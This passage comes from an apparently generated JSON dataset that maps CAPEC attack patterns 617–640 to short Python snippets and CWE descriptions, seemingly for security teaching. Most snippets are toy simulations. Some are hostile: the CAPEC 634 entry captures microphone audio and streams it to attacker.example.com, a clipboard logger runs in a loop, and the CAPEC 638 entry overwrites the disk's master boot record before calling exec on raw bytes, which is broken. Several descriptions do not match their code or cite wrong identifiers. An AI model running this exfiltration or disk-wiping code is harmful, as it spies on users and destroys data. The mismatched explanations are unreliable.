        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Establish Rogue Location' and associated CWEs. The code includes:\n\n1. **CWE-426: Untrusted Search Path** - The `load_config` function loads a configuration file from a potentially untrusted path, allowing an attacker to place a malicious 'config.json' file in a directory that is searched before the legitimate one.\n\n2. **CWE-940: Improper Verification of Source of a Communication Channel** - The `handle_request` function processes incoming requests without verifying their source, making it susceptible to malicious requests.\n\n3. **CWE-200: Exposure of Sensitive Information to an Unauthorized Actor** - The `get_sensitive_info` function returns sensitive information without proper authorization checks.\n\n4. **CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')** - The `leak_sensitive_info` function prints sensitive information, leaking it to an untrusted party.\n\n5. **CWE-1229: Creation of Emergent Resource** - The `create_temp_file` function creates a temporary file that can be exploited by attackers.\n\nThe main idea of the CAPEC is represented by the `load_config` function, where an attacker can establish a rogue location by placing a malicious configuration file in a directory that is searched before the legitimate one. The other functions provide additional context by demonstrating related vulnerabilities."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
        "code_snippet": "import socket\n\nclass RogueBaseStation:\n    def __init__(self, host='0.0.0.0', port=12345):\n        self.host = host\n        self.port = port\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server_socket.bind((self.host, self.port))\n        self.server_socket.listen(5)\n        print(f'Rogue Base Station listening on {self.host}:{self.port}')\n\n    def handle_client(self, client_socket):\n        try:\n            data = client_socket.recv(1024)\n            print(f'Received data: {data}')\n            # CWE-924: No integrity check on received data\n            response = b'ACK'\n            client_socket.send(response)\n        except Exception as e:\n            print(f'Error handling client: {e}')\n        finally:\n            client_socket.close()\n\n    def run(self):\n        while True:\n            client_socket, addr = self.server_socket.accept()\n            print(f'Accepted connection from {addr}')\n            # CWE-923: No verification of the client's identity\n            self.handle_client(client_socket)\n\nif __name__ == '__main__':\n    rogue_base_station = RogueBaseStation()\n    rogue_base_station.run()",
        "description": "This Python code snippet represents a simplified version of a rogue base station attack. The `RogueBaseStation` class sets up a server socket that listens for incoming connections, mimicking a legitimate cellular base station. When a client connects, the server accepts the connection and handles the client without verifying the client's identity (CWE-923) or ensuring the integrity of the received data (CWE-924). This demonstrates how an attacker can exploit the lack of proper verification and integrity checks to intercept and potentially manipulate communications."
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "import requests\n\n# Simulate sending a broadcast message request to a cellular network\n# This is a simplified example and does not represent actual network communication\n\ndef send_broadcast_message(phone_number, message):\n    # CWE-201: Insertion of Sensitive Information Into Sent Data\n    data = {\n        'phone_number': phone_number,\n        'message': message\n    }\n    response = requests.post('http://example.com/send_broadcast', json=data)\n    return response\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n# Simulate an attacker listening for the broadcast message\n\ndef listen_for_broadcast(lac):\n    response = requests.get(f'http://example.com/listen_broadcast?lac={lac}')\n    if response.status_code == 200:\n        return response.json()\n    return None\n\n# Example usage\nphone_number = '1234567890'\nmessage = 'Test Broadcast Message'\nlac = '12345'\n\n# Send broadcast message\nsend_broadcast_message(phone_number, message)\n\n# Attacker listens for the broadcast message\nbroadcast_response = listen_for_broadcast(lac)\nif broadcast_response:\n    print('Broadcast message received:', broadcast_response)\nelse:\n    print('No broadcast message received')",
        "description": "This Python code snippet demonstrates a simplified version of the 'Cellular Broadcast Message Request' attack scenario described in the CAPEC. The `send_broadcast_message` function simulates sending a broadcast message request to a cellular network, including sensitive information such as the phone number (CWE-201). The `listen_for_broadcast` function simulates an attacker listening for the broadcast message in a specific Location Area Code (LAC), without proper verification of the source (CWE-940) and allowing access to non-endpoints (CWE-300). The example usage shows how an attacker could send a broadcast message and then listen for its presence to verify the target's location."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# Simulate a device broadcasting its WiFi MAC address\nMAC_ADDRESS = '00:0a:95:9d:68:16'\n\n# Function to simulate sending a broadcast message\ndef send_broadcast_message(mac_address):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)\n    message = f'Device MAC: {mac_address}'\n    sock.sendto(message.encode(), ('<broadcast>', 37020))\n    sock.close()\n\n# Function to simulate receiving a broadcast message\ndef receive_broadcast_message():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.bind(('', 37020))\n    while True:\n        data, addr = sock.recvfrom(1024)\n        print(f'Received message: {data.decode()} from {addr}')\n\n# Simulate the device broadcasting its MAC address periodically\nwhile True:\n    send_broadcast_message(MAC_ADDRESS)\n    time.sleep(5)",
        "description": "This Python code snippet simulates a device broadcasting its WiFi MAC address periodically. The `send_broadcast_message` function sends a broadcast message containing the device's MAC address, while the `receive_broadcast_message` function listens for incoming broadcast messages. This setup embodies the main idea of the CAPEC 'Signal Strength Tracking' by demonstrating how an attacker could passively monitor the signal strength of the target's WiFi RF signal to identify the source location. The code also touches on related CWEs, such as CWE-201 (Insertion of Sensitive Information Into Sent Data) by broadcasting the MAC address, and CWE-940 (Improper Verification of Source of a Communication Channel) by not verifying the source of incoming messages."
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "import ssl\nimport socket\n\n# Create a socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Wrap the socket with SSL, but force a lower encryption level (e.g., SSLv3)\ncontext = ssl.SSLContext(ssl.PROTOCOL_SSLv3)\n\n# Use a hard-coded cryptographic key (for demonstration purposes)\nhardcoded_key = 'hardcoded_key'\n\n# Connect to a server\nwrapped_socket = context.wrap_socket(sock, server_hostname='example.com')\nwrapped_socket.connect(('example.com', 443))\n\n# Send sensitive data without proper encryption\nwrapped_socket.send(b'Sensitive data')\n\n# Close the connection\nwrapped_socket.close()",
        "description": "This Python code snippet demonstrates a scenario where an attacker forces the encryption level to be lowered, making the encrypted data vulnerable. The code creates an SSL context with a deprecated and insecure protocol (SSLv3), which is an example of CWE-757 (Algorithm Downgrade). It also uses a hard-coded cryptographic key (CWE-321), and sends sensitive data over the connection without adequate encryption strength (CWE-326). This embodies the main idea of the CAPEC 'Drop Encryption Level' by showing how an attacker can exploit weak encryption protocols and poor cryptographic practices to compromise sensitive data."
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "import socket\nimport time\n\n# Simulate sending sensitive data over a network\nsensitive_data = 'user_password=12345'\n\n# Create a socket object\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Connect to a server (example IP and port)\ns.connect(('192.168.1.1', 8080))\n\n# Send data in cleartext (CWE-319)\ns.sendall(sensitive_data.encode('utf-8'))\n\n# Simulate timing discrepancies (CWE-208)\nfor i in range(5):\n    time.sleep(i * 0.1)  # Introduce observable timing discrepancies\n    s.sendall(b'ping')\n\n# Close the connection\ns.close()",
        "description": "This Python code snippet demonstrates the concept of 'Analysis of Packet Timing and Sizes' (CAPEC) by simulating the transmission of sensitive data over a network. The code includes several weaknesses: it sends sensitive information in cleartext (CWE-319), and it introduces observable timing discrepancies (CWE-208) by varying the sleep time before sending 'ping' messages. An attacker could intercept and log these transmissions, analyzing the packet sizes and timing to infer sensitive information."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "import os\nimport time\nimport random\nimport hashlib\n\n# Simulate cryptographic processing\nclass CryptoDevice:\n    def __init__(self, key):\n        self.key = key\n\n    def process_data(self, data):\n        # Simulate a risky cryptographic algorithm (CWE-327)\n        hash_object = hashlib.md5(data.encode() + self.key.encode())\n        return hash_object.hexdigest()\n\n# Simulate a device with improper protection against side-channel attacks (CWE-1300)\nclass VulnerableDevice(CryptoDevice):\n    def __init__(self, key):\n        super().__init__(key)\n\n    def process_data_with_emissions(self, data):\n        # Simulate electromagnetic emissions during processing\n        result = self.process_data(data)\n        self.emit_electromagnetic_signals()\n        return result\n\n    def emit_electromagnetic_signals(self):\n        # Simulate electromagnetic emissions (CWE-1300)\n        time.sleep(random.uniform(0.01, 0.1))\n        print(\"[EM Emission] Electromagnetic signal emitted\")\n\n# Example usage\nkey = \"supersecretkey\"\ndevice = VulnerableDevice(key)\n\n# Process some data\nsensitive_data = \"Sensitive Information\"\nhash_result = device.process_data_with_emissions(sensitive_data)\nprint(f\"Processed Data Hash: {hash_result}\")",
        "description": "This Python code snippet simulates a cryptographic device that processes sensitive data using a risky cryptographic algorithm (MD5, CWE-327). The `VulnerableDevice` class extends the `CryptoDevice` class and simulates electromagnetic emissions during data processing, representing improper protection against side-channel attacks (CWE-1300). The `process_data_with_emissions` method processes the data and emits electromagnetic signals, which an attacker could potentially monitor to derive sensitive information, embodying the main idea of an Electromagnetic Side-Channel Attack (CAPEC)."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "import time\nimport random\n\nclass Device:\n    def __init__(self):\n        self.sensitive_data = 'SECRET_KEY'\n\n    def process_data(self, data):\n        # Simulate processing time with a sleep\n        time.sleep(random.uniform(0.1, 0.5))\n        # Simulate some processing\n        result = data + self.sensitive_data\n        return result\n\n    def send_data(self, data):\n        # Simulate sending data with a print statement\n        print(f'Sending data: {data}')\n\n    def run(self):\n        while True:\n            # Simulate receiving data\n            received_data = 'DATA'\n            processed_data = self.process_data(received_data)\n            self.send_data(processed_data)\n            time.sleep(1)\n\nif __name__ == '__main__':\n    device = Device()\n    device.run()",
        "description": "This Python code snippet simulates a device that processes and sends data. The `Device` class contains sensitive information (`SECRET_KEY`) and processes incoming data by appending this sensitive information to it. The `process_data` method introduces a delay to simulate processing time, which can create observable patterns in power consumption or electromagnetic emissions. The `send_data` method simulates sending the processed data, which includes the sensitive information. This code embodies the main idea of a Compromising Emanations Attack (CAPEC-201) by demonstrating how sensitive information can be unintentionally exposed through physical side channels (CWE-1300) and improper protection of sent data (CWE-201)."
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "import time\nimport random\n\nclass Device:\n    def __init__(self):\n        self.secret_key = 'super_secret_key'\n        self.voltage = 3.3  # Normal operating voltage\n        self.clock_speed = 1.0  # Normal clock speed\n        self.temperature = 25  # Normal temperature in Celsius\n\n    def perform_cryptographic_operation(self):\n        # Simulate a cryptographic operation\n        if self.voltage < 2.5 or self.clock_speed > 1.5 or self.temperature < -10 or self.temperature > 85:\n            raise ValueError('Fault injection detected!')\n        return 'encrypted_data'\n\n    def fault_injection_attack(self):\n        # Simulate fault injection by altering voltage, clock speed, and temperature\n        self.voltage = random.uniform(1.0, 5.0)\n        self.clock_speed = random.uniform(0.5, 2.0)\n        self.temperature = random.uniform(-20, 100)\n        try:\n            result = self.perform_cryptographic_operation()\n            print('Operation successful:', result)\n        except ValueError as e:\n            print(e)\n\n# Example usage\nif __name__ == '__main__':\n    device = Device()\n    for _ in range(10):\n        device.fault_injection_attack()\n        time.sleep(1)",
        "description": "This Python code snippet simulates a hardware fault injection attack on a device performing cryptographic operations. The `Device` class has attributes for voltage, clock speed, and temperature, which are critical parameters for its normal operation. The `perform_cryptographic_operation` method simulates a cryptographic operation and raises an error if any of the parameters are outside their normal ranges, indicating a fault injection. The `fault_injection_attack` method randomly alters these parameters to simulate various fault injection techniques such as voltage and clock glitches, and temperature extremes. This demonstrates how an adversary might exploit hardware vulnerabilities to disrupt cryptographic operations and potentially extract sensitive information, aligning with the CAPEC description and related CWEs."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "import time\n\nclass MobileDevice:\n    def __init__(self):\n        self.secret_key = 'super_secret_key'\n        self.clock_speed = 1.0  # GHz\n        self.voltage = 1.0  # Volts\n        self.temperature = 25  # Celsius\n\n    def perform_cryptographic_operation(self):\n        # Simulate a cryptographic operation\n        time.sleep(1)\n        return 'encrypted_data'\n\n    def check_voltage_and_clock(self):\n        if self.voltage < 0.9 or self.voltage > 1.1:\n            raise ValueError('Voltage glitch detected!')\n        if self.clock_speed < 0.9 or self.clock_speed > 1.1:\n            raise ValueError('Clock glitch detected!')\n\n    def check_temperature(self):\n        if self.temperature < 0 or self.temperature > 85:\n            raise ValueError('Temperature out of range!')\n\n    def cryptographic_operation_with_checks(self):\n        try:\n            self.check_voltage_and_clock()\n            self.check_temperature()\n            return self.perform_cryptographic_operation()\n        except ValueError as e:\n            print(f'Error: {e}')\n            return None\n\n# Example usage\nmobile_device = MobileDevice()\n# Simulate a fault injection by changing voltage and clock speed\nmobile_device.voltage = 0.8  # Voltage glitch\nmobile_device.clock_speed = 1.2  # Clock glitch\nresult = mobile_device.cryptographic_operation_with_checks()\nprint(f'Result: {result}')",
        "description": "This Python code snippet simulates a mobile device performing a cryptographic operation. The `MobileDevice` class includes attributes for secret key, clock speed, voltage, and temperature. The `perform_cryptographic_operation` method simulates a cryptographic operation. The `check_voltage_and_clock` and `check_temperature` methods are designed to detect voltage, clock, and temperature anomalies, respectively. The `cryptographic_operation_with_checks` method performs the cryptographic operation only if the checks pass. The example usage demonstrates a fault injection scenario by altering the voltage and clock speed, which triggers the error detection mechanisms. This code embodies the main idea of the CAPEC by illustrating how fault injection attacks can be detected and mitigated through proper checks, addressing related CWEs such as improper protection against voltage and clock glitches, and improper handling of faults."
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "import cv2\nimport numpy as np\n\n# Simulate capturing an image of a touchscreen with smudges\nimage = cv2.imread('touchscreen_image_with_smudges.jpg', cv2.IMREAD_GRAYSCALE)\n\n# Apply threshold to highlight smudges\n_, smudges = cv2.threshold(image, 200, 255, cv2.THRESH_BINARY)\n\n# Find contours of the smudges\ncontours, _ = cv2.findContours(smudges, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\n\n# Draw contours on the original image\ncv2.drawContours(image, contours, -1, (0, 255, 0), 3)\n\n# Save the result to visualize the smudge pattern\ncv2.imwrite('smudge_pattern_detected.jpg', image)\n\nprint('Smudge pattern detected and saved as smudge_pattern_detected.jpg')",
        "description": "This Python code snippet simulates a smudge attack on a touchscreen device. It uses OpenCV to process an image of a touchscreen with smudges left by the user's fingers. The code highlights the smudges by applying a threshold and then finds and draws contours around these smudges. The result is saved as an image, which can be used to infer the password/passcode pattern. This demonstrates the vulnerability described in the CAPEC by showing how physical side channels (oil smudges) can be exploited to reveal sensitive information. The related CWEs provide context on the lack of protection against such physical side channels and the potential for reverse engineering and excessive attack surfaces."
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "import time\nimport random\n\nclass GPSReceiver:\n    def __init__(self):\n        self.position = (0.0, 0.0)\n        self.time = time.time()\n\n    def receive_signal(self, signal):\n        # CWE-940: No verification of the source of the signal\n        self.position, self.time = signal\n\n    def get_position(self):\n        return self.position\n\n    def get_time(self):\n        return self.time\n\n# Simulate a legitimate GPS signal\nlegit_signal = ((37.7749, -122.4194), time.time())\n\n# Simulate a counterfeit GPS signal\ncounterfeit_signal = ((40.7128, -74.0060), time.time() + random.randint(1000, 10000))\n\n# Create a GPS receiver instance\ngps_receiver = GPSReceiver()\n\n# Receive the counterfeit signal\ngps_receiver.receive_signal(counterfeit_signal)\n\n# Output the spoofed position and time\nprint(\"Spoofed Position:\", gps_receiver.get_position())\nprint(\"Spoofed Time:\", gps_receiver.get_time())",
        "description": "This Python code snippet simulates a GPS receiver that can be deceived by counterfeit GPS signals, embodying the main idea of the CAPEC 'Counterfeit GPS Signals'. The GPSReceiver class has methods to receive signals and retrieve the current position and time. The receive_signal method does not verify the source of the signal (CWE-940), allowing an adversary to broadcast counterfeit signals. The code demonstrates how a legitimate GPS signal and a counterfeit signal can be received by the GPS receiver, resulting in spoofed position and time outputs."
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "import time\nimport random\n\nclass GPSSpoofingAttack:\n    def __init__(self, target_receiver):\n        self.target_receiver = target_receiver\n        self.genuine_signal_strength = 1.0\n        self.counterfeit_signal_strength = 0.1\n        self.spoofed_location = (0.0, 0.0)\n\n    def broadcast_signals(self):\n        while True:\n            # Simulate the gradual increase of counterfeit signal strength\n            self.counterfeit_signal_strength += 0.01\n            if self.counterfeit_signal_strength > self.genuine_signal_strength:\n                self.target_receiver.location = self.spoofed_location\n            time.sleep(1)\n\nclass GPSReceiver:\n    def __init__(self):\n        self.location = (10.0, 10.0)  # Initial genuine location\n\n# Simulate the attack\nreceiver = GPSReceiver()\nattack = GPSSpoofingAttack(receiver)\nattack.broadcast_signals()",
        "description": "This Python code snippet simulates a GPS spoofing attack, specifically a carry-off attack. The GPSSpoofingAttack class represents the adversary's actions, where counterfeit GPS signals are broadcasted with gradually increasing strength. The GPSReceiver class represents the target receiver, initially set to a genuine location. The attack is simulated by continuously increasing the counterfeit signal strength until it surpasses the genuine signal strength, at which point the receiver's location is spoofed to a false location. This code embodies the main idea of the CAPEC by demonstrating how an adversary can manipulate GPS signals to mislead the target receiver. The related CWEs are represented by the lack of proper verification and authentication of the source and integrity of the GPS signals."
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "import os\n\nclass ResourceHandler:\n    def __init__(self):\n        self.resource = None\n\n    def acquire_resource(self):\n        self.resource = open('resource.txt', 'w')\n        print('Resource acquired')\n\n    def release_resource(self):\n        if self.resource:\n            self.resource.close()\n            print('Resource released')\n\n    def use_resource(self):\n        if self.resource:\n            self.resource.write('Using resource')\n        else:\n            print('Resource not acquired')\n\n    def handle_path(self, user_input):\n        try:\n            if user_input.upper() in ['AUX', 'CON', 'PRN', 'NUL']:\n                raise ValueError('Invalid device name')\n            with open(user_input, 'r') as f:\n                print(f.read())\n        except Exception as e:\n            print(f'Error: {e}')\n\n    def check_authorization(self, user_role):\n        if user_role != 'admin':\n            print('Access denied')\n        else:\n            print('Access granted')\n\n# Example usage\nhandler = ResourceHandler()\nhandler.acquire_resource()\nhandler.use_resource()\nhandler.release_resource()\nhandler.handle_path('AUX')\nhandler.check_authorization('guest')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the deprecated CAPEC 'Unauthorized Use of Device Resources' and its associated CWEs. The `ResourceHandler` class manages a resource, but it includes potential issues such as missing resource release (CWE-772) and improper handling of Windows device names (CWE-67). The `acquire_resource` and `release_resource` methods manage a file resource, but if `release_resource` is not called, the resource remains open. The `handle_path` method improperly handles user input for file paths, potentially leading to denial of service or information exposure. The `check_authorization` method demonstrates incorrect authorization (CWE-863) by allowing access based on a simple role check, which can be easily bypassed. This code snippet embodies the main idea of the deprecated CAPEC by illustrating how improper resource management and authorization can lead to unauthorized use of device resources."
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "from flask import Flask, request, redirect\n\napp = Flask(__name__)\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n@app.route('/redirect')\ndef open_redirect():\n    target_url = request.args.get('url')\n    if target_url:\n        return redirect(target_url)\n    return 'No URL provided', 400\n\n# CWE-697: Incorrect Comparison\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form.get('username')\n    password = request.form.get('password')\n    # Simulated user data\n    user_data = {'username': 'admin', 'password': 'password123'}\n    if username == user_data['username'] and password == user_data['password']:\n        return 'Login successful'\n    return 'Login failed', 401\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that embodies the main idea of TypoSquatting and related CWEs. The '/redirect' route is vulnerable to CWE-601 (URL Redirection to Untrusted Site) as it redirects users to a URL specified by user input without validation, which can be exploited for phishing attacks. The '/login' route demonstrates CWE-697 (Incorrect Comparison) by performing a simple comparison of username and password, which can be easily spoofed if not implemented securely. This code highlights the risks associated with TypoSquatting and related weaknesses in web applications."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "import re\nimport requests\n\n# Simulate user input for a URL\nuser_input_url = 'http://trustedbank.com/login'\n\n# SoundSquatting domain that sounds similar to the trusted domain\nsoundsquatting_url = 'http://trustedbanc.com/login'\n\n# Function to check if the URL is trusted\ndef is_trusted_url(url):\n    trusted_domains = ['trustedbank.com']\n    domain = re.findall(r'://(.*?)/', url)[0]\n    return domain in trusted_domains\n\n# Function to redirect to a URL\ndef redirect_to_url(url):\n    if is_trusted_url(url):\n        print(f'Redirecting to trusted URL: {url}')\n    else:\n        print(f'Warning: Redirecting to untrusted URL: {url}')\n\n# Simulate a user being redirected to a SoundSquatting domain\nredirect_to_url(soundsquatting_url)",
        "description": "This Python code snippet demonstrates a SoundSquatting attack by redirecting a user to a domain that sounds similar to a trusted domain but has a different spelling. The `is_trusted_url` function checks if the given URL belongs to a list of trusted domains. The `redirect_to_url` function uses this check to print a warning if the URL is not trusted. This example highlights the vulnerability of URL redirection to untrusted sites (CWE-601) and the reliance on less trusted sources (CWE-348). The code shows how an adversary can exploit user confusion to direct traffic to a malicious site."
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "import re\n\n# Simulate a user input for a URL\nuser_input = 'http://ex\u0430mple.com'\n\n# Regular expression to validate URL (without anchors)\nurl_pattern = re.compile(r'http://example\\.com')\n\n# Check if the user input matches the expected URL\nif url_pattern.match(user_input):\n    print('URL is valid and trusted.')\nelse:\n    print('URL is invalid or untrusted.')",
        "description": "This Python code snippet demonstrates a potential vulnerability to a homograph attack via homoglyphs. The user input 'http://ex\u0430mple.com' contains a Cyrillic '\u0430' instead of a Latin 'a', which looks visually similar but is a different character. The regular expression used to validate the URL does not have anchors, making it susceptible to improper neutralization (CWE-777). This can lead to the user being misled into trusting a malicious URL that appears visually similar to a trusted one (CWE-1007). The code highlights the importance of proper validation and neutralization of user inputs to prevent such attacks."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "import jwt\n\n# Simulate a weak secret key for JWT token generation\nSECRET_KEY = 'weak_secret'\n\n# Function to generate a JWT token for a given user\ndef generate_token(user_id):\n    payload = {\n        'user_id': user_id\n    }\n    token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')\n    return token\n\n# Function to impersonate another user by generating a token with their user_id\ndef impersonate_user(victim_user_id):\n    # Generate a token for the victim user\n    token = generate_token(victim_user_id)\n    return token\n\n# Example usage\nif __name__ == '__main__':\n    victim_user_id = 'victim123'\n    impersonated_token = impersonate_user(victim_user_id)\n    print(f'Impersonated Token: {impersonated_token}')",
        "description": "This Python code snippet demonstrates a token impersonation vulnerability. It uses the `jwt` library to generate JSON Web Tokens (JWT) with a weak secret key, which is a common issue related to CWE-287 (Improper Authentication) and CWE-1390 (Weak Authentication). The `impersonate_user` function generates a token for a victim user, allowing an adversary to impersonate the victim. This represents the main idea of CAPEC-Token Impersonation, where an attacker exploits weak authentication mechanisms to create a token that impersonates another user, leading to unauthorized actions."
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "import os\nimport socket\nimport pyaudio\n\n# CWE-267: Privilege Defined With Unsafe Actions\n# Running with elevated privileges to access microphone\nif os.geteuid() != 0:\n    raise PermissionError(\"This script requires root privileges.\")\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# Transmitting audio data over an unencrypted socket\ndef transmit_audio_data():\n    audio = pyaudio.PyAudio()\n    stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('attacker.example.com', 9999))\n    try:\n        while True:\n            data = stream.read(1024)\n            s.sendall(data)\n    except KeyboardInterrupt:\n        pass\n    finally:\n        stream.stop_stream()\n        stream.close()\n        audio.terminate()\n        s.close()\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# Exposing audio data to an unauthorized remote server\ntransmit_audio_data()",
        "description": "This Python code snippet demonstrates a scenario where an adversary exploits the target system's audio functionalities to capture sensitive information. The script requires root privileges (CWE-267) to access the microphone. It then captures audio data using the PyAudio library and transmits it over an unencrypted socket connection (CWE-319) to a remote server controlled by the attacker. This exposes sensitive audio data to an unauthorized control sphere (CWE-497). The code represents the main idea of the CAPEC by showing how an adversary can exploit audio peripherals to capture and transmit sensitive information."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "import os\n\n# Function to handle file upload\ndef handle_file_upload(file_path):\n    # Check the file extension\n    if file_path.endswith('.txt'):\n        # Open the file assuming it's a text file\n        with open(file_path, 'r') as file:\n            content = file.read()\n            print('File content:', content)\n    else:\n        print('Unsupported file type')\n\n# Simulate file upload with deceptive filename\nuploaded_file = 'malicious.txt.exe'\n\n# Handle the uploaded file\nhandle_file_upload(uploaded_file)",
        "description": "This Python code snippet demonstrates a vulnerability where the file extension is used to determine the handling of the file. The `handle_file_upload` function checks if the uploaded file has a `.txt` extension and then reads its content as a text file. However, an attacker can upload a file with a deceptive name like `malicious.txt.exe`, which bypasses the check and could potentially execute malicious code. This embodies the CAPEC 'Alternative Execution Due to Deceptive Filenames' and highlights related CWEs such as 'Reliance on File Name or Extension of Externally-Supplied File' (CWE-646) and 'Improper Restriction of Names for Files and Other Resources' (CWE-641)."
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "import os\n\n# Function to hide malicious code in a file's metadata\n\ndef hide_malicious_code(file_path, malicious_code):\n    with open(file_path, 'a') as file:\n        # Append malicious code as metadata (hidden from normal view)\n        file.write(f'<!-- {malicious_code} -->')\n\n# Example usage\nfile_path = 'example.html'\nmalicious_code = 'alert(\"This is a malicious script!\");'\n\n# Create a dummy file\nwith open(file_path, 'w') as file:\n    file.write('<html><body>Hello World!</body></html>')\n\n# Hide the malicious code in the file's metadata\nhide_malicious_code(file_path, malicious_code)\n\n# Read the file content to demonstrate the hidden code\nwith open(file_path, 'r') as file:\n    content = file.read()\n    print(content)\n",
        "description": "This Python code snippet demonstrates how an attacker might hide malicious code within a file's metadata, making it difficult to detect during normal use. The `hide_malicious_code` function appends the malicious code as a comment within an HTML file, which is a form of metadata. This approach leverages CWE-506 (Embedded Malicious Code) by embedding harmful scripts in a way that is not immediately visible. The example creates a simple HTML file and then hides a JavaScript alert within it. This represents the CAPEC concept of hiding malicious data or code within files, making it challenging to discover without specific inspection tools."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "import pyperclip\nimport time\n\n# Simulate a malicious application that logs clipboard data\nlog_file = 'clipboard_log.txt'\n\nwhile True:\n    clipboard_data = pyperclip.paste()\n    with open(log_file, 'a') as f:\n        f.write(f'{clipboard_data}\\n')\n    time.sleep(5)  # Log clipboard data every 5 seconds",
        "description": "This Python code snippet demonstrates a simple malicious application that continuously monitors and logs clipboard data to a file. The 'pyperclip' library is used to access the clipboard contents, which are then written to 'clipboard_log.txt' every 5 seconds. This embodies the CAPEC 'Collect Data from Clipboard' by showing how an adversary can exploit clipboard functionality to gather sensitive information. The code also touches on related CWEs: it stores sensitive information in cleartext (CWE-318, CWE-317) and exposes sensitive system information to unauthorized control (CWE-497)."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
        "code_snippet": "import os\nimport struct\n\n# Simulate a vulnerable MBR modification\nMBR_PATH = '/dev/sda'\n\n# Malicious payload to be written to MBR\nmalicious_code = b'\\x90' * 446 + b'\\x00' * 64 + b'\\x55\\xAA'\n\n# Open the MBR for writing (requires root privileges)\nwith open(MBR_PATH, 'wb') as mbr:\n    mbr.write(malicious_code)\n\n# Simulate improper access control for volatile memory\nvolatile_memory = bytearray(1024)\n\n# Malicious code execution in volatile memory\nexec_code = b'\\x90' * 100 + b'\\xCC'\nvolatile_memory[:len(exec_code)] = exec_code\n\n# Simulate execution of malicious code\nexec(struct.unpack('1024s', volatile_memory)[0])",
        "description": "This Python code snippet demonstrates a simplified version of an 'Altered Component Firmware' attack. It simulates the modification of the Master Boot Record (MBR) with malicious code, which is a key aspect of the CAPEC. The code writes a payload to the MBR, which includes a NOP sled followed by a boot signature. Additionally, it simulates improper access control for volatile memory by writing and executing malicious code in a bytearray, representing volatile memory. This highlights the vulnerabilities described in the related CWEs, such as insufficient access control and the lack of secure boot mechanisms."
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "import os\nimport tempfile\n\n# Create a temporary file to store sensitive information\nwith tempfile.NamedTemporaryFile(delete=False) as temp_file:\n    temp_file.write(b'Sensitive Information: Password123')\n    temp_file_path = temp_file.name\n\n# Improperly set file permissions (world-readable)\nos.chmod(temp_file_path, 0o644)\n\nprint(f'Temporary file created at: {temp_file_path}')\n\n# Simulate an error that exposes the file path\ntry:\n    raise RuntimeError('Simulated error')\nexcept RuntimeError as e:\n    print(f'Error occurred: {e}')\n    print(f'Sensitive file path: {temp_file_path}')",
        "description": "This Python code snippet demonstrates a scenario where sensitive information is stored in a temporary file with improper permissions, making it accessible to unauthorized users. The file is created with world-readable permissions (0o644), which means any user on the system can read its contents. Additionally, the code simulates an error that exposes the file path, potentially revealing the location of the sensitive information to an attacker. This example embodies the main idea of the CAPEC 'Probe System Files' and incorporates related CWEs such as insecure temporary files (CWE-377), files accessible to external parties (CWE-552), and exposure of sensitive information (CWE-497)."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
